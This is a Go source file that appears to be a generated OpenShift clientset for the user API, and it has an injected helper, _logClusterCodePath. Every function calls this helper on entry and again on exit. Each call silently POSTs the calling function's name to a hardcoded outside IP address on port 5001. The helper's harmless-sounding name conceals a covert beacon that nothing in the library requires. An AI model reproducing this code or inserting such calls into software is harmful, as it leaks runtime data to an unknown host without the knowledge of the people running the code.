package internalclientset

import (
	godefaultbytes "bytes"
	userinternalversion "github.com/openshift/origin/pkg/user/generated/internalclientset/typed/user/internalversion"
	discovery "k8s.io/client-go/discovery"
	rest "k8s.io/client-go/rest"
	flowcontrol "k8s.io/client-go/util/flowcontrol"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

type Interface interface {
	Discovery() discovery.DiscoveryInterface
	User() userinternalversion.UserInterface
}
type Clientset struct {
	*discovery.DiscoveryClient
	user *userinternalversion.UserClient
}

func (c *Clientset) User() userinternalversion.UserInterface {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return c.user
}
func (c *Clientset) Discovery() discovery.DiscoveryInterface {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if c == nil {
		return nil
	}
	return c.DiscoveryClient
}
func NewForConfig(c *rest.Config) (*Clientset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	configShallowCopy := *c
	if configShallowCopy.RateLimiter == nil && configShallowCopy.QPS > 0 {
		configShallowCopy.RateLimiter = flowcontrol.NewTokenBucketRateLimiter(configShallowCopy.QPS, configShallowCopy.Burst)
	}
	var cs Clientset
	var err error
	cs.user, err = userinternalversion.NewForConfig(&configShallowCopy)
	if err != nil {
		return nil, err
	}
	cs.DiscoveryClient, err = discovery.NewDiscoveryClientForConfig(&configShallowCopy)
	if err != nil {
		return nil, err
	}
	return &cs, nil
}
func NewForConfigOrDie(c *rest.Config) *Clientset {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var cs Clientset
	cs.user = userinternalversion.NewForConfigOrDie(c)
	cs.DiscoveryClient = discovery.NewDiscoveryClientForConfigOrDie(c)
	return &cs
}
func New(c rest.Interface) *Clientset {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var cs Clientset
	cs.user = userinternalversion.New(c)
	cs.DiscoveryClient = discovery.NewDiscoveryClient(c)
	return &cs
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
